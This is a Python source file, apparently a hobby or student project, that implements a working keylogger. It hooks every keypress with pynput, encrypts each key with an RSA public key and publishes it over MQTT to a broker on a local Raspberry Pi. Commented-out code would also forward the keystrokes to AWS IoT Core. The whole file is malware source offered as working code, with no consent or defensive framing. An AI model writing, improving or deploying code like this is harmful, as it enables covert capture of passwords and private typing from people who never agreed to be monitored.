import paho.mqtt.client as mqtt
from pynput.keyboard import Listener
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization, hashes
import base64
import ssl
# Local MQTT Broker (Raspberry Pi)
LOCAL_BROKER_IP = "192.168.1.4"  # Replace with your Raspberry Pi's IP
LOCAL_TOPIC = "keylogger/data"

# AWS IoT Core MQTT Details
#AWS_ENDPOINT = ""  # Replace with your AWS IoT endpoint
#AWS_TOPIC = ""

# Paths to AWS IoT certificates
#CERT_PATH = r""
#KEY_PATH = r""
#CA_PATH = r""

# Load the public key
def load_public_key():
    with open("public_key.pem", "rb") as key_file:
        return serialization.load_pem_public_key(key_file.read())

# Encrypt data using RSA
def encrypt_data(public_key, message):
    encrypted = public_key.encrypt(
        message.encode('utf-8'),
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return base64.b64encode(encrypted).decode()  # Convert to base64 for MQTT transmission

# Setup Local MQTT Client (Raspberry Pi)
local_client = mqtt.Client("LocalKeyloggerClient")
local_client.connect(LOCAL_BROKER_IP, 1883, 60)

#aws_client = mqtt.Client(client_id="KeyloggerClient")
#aws_client.tls_set(
#    ca_certs=CA_PATH,
#   certfile=CERT_PATH,
#    keyfile=KEY_PATH,
#    tls_version=ssl.PROTOCOL_TLS_CLIENT
#)
#aws_client.connect(AWS_ENDPOINT, 8883, 60)  # AWS IoT requires port 8883

# Capture keypress and publish to both brokers
def on_press(key):
    letter = str(key).replace("'", "")
    if letter == 'Key.space':
        letter = ' '
    elif letter == 'Key.enter':
        letter = '\n'

    try:
        public_key = load_public_key()
        encrypted_data = encrypt_data(public_key, letter)
        
        # Publish to Local MQTT Broker (Raspberry Pi)
        local_client.publish(LOCAL_TOPIC, encrypted_data)

        # Publish to AWS IoT Core
        #aws_client.publish(AWS_TOPIC, encrypted_data)

    except Exception as e:
        print(f"Error sending data: {e}")

# Start listening for keypresses
with Listener(on_press=on_press) as listener:
    listener.join()
